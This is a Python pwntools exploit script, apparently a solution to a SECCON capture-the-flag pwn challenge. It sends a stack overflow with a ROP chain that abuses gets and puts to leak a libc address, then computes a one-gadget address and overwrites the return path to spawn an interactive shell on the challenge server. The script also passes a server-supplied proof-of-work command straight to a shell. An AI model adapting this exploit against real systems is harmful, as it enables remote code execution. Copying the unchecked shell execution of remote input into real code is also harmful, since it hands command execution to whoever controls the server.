#!/usr/bin/env python3

import argparse
from pwn import *
import subprocess
import sys


if not sys.warnoptions:
    import warnings
    warnings.simplefilter("ignore")

context.log_level = 'warning'
EXE = "./run_patched"
HOSTNAME = "mrga.seccon.games"
PORT = 7428

def do_stuff(r, is_remote=False):
    main_start = 0x4011ad
    puts_call = 0x401060
    gets_call = 0x401080
    data = 0x404000 + 0x800
    clear_rax = 0x4011a6

    if is_remote:
        # solve PoW
        r.recvline()
        pow = r.recvlineS()
        print("Solving", pow)
        pow = subprocess.check_output(pow, shell=True).decode().strip()
        print(pow)
        r.sendlineafter(":", pow)

    rop = [
        p64(gets_call), # overwrite lock pointer
        p64(gets_call), # write into second int
        p64(puts_call), # leak address
        p64(main_start) # get more input
    ]
    r.sendlineafter(b">", b"A" * 0x10 + b"B"*8 + b"".join(rop))
    r.sendline(b"\xff" * 0x8 + b"\0" * 8)
    r.sendline(b"AAAB")

    r.recvuntil(b"AAAB")
    r.recv(4)
    addr = u64(r.recv(8)[:6] + b"\0\0")
    print("addr", hex(addr))

    base = (addr - 0x740) + 0x3000
    oneshot = base + 0xef52b
    print("base", hex(base))
    print("gadget", hex(oneshot))
    r.sendline(b"A" * 0x10 + p64(data) + p64(clear_rax) + p64(data) + p64(oneshot) * 4 + b"A"*8)

    r.interactive()


parser = argparse.ArgumentParser(description="Template PWNtools script.")
group = parser.add_mutually_exclusive_group()
group.add_argument("--remote", action="store_true", help="Connect to remote host", default=False)
group.add_argument("--debug", action="store_true", help="Debug the local executable with a given command file", default=False)
args = parser.parse_args(sys.argv[1:])

if args.remote:
    r = remote(HOSTNAME, PORT)
    do_stuff(r, True)
    r.close()
elif args.debug:
    r = gdb.debug(EXE, "b main")
    do_stuff(r)
    r.close()
else:
    r = process(EXE)
    do_stuff(r)
    r.close()
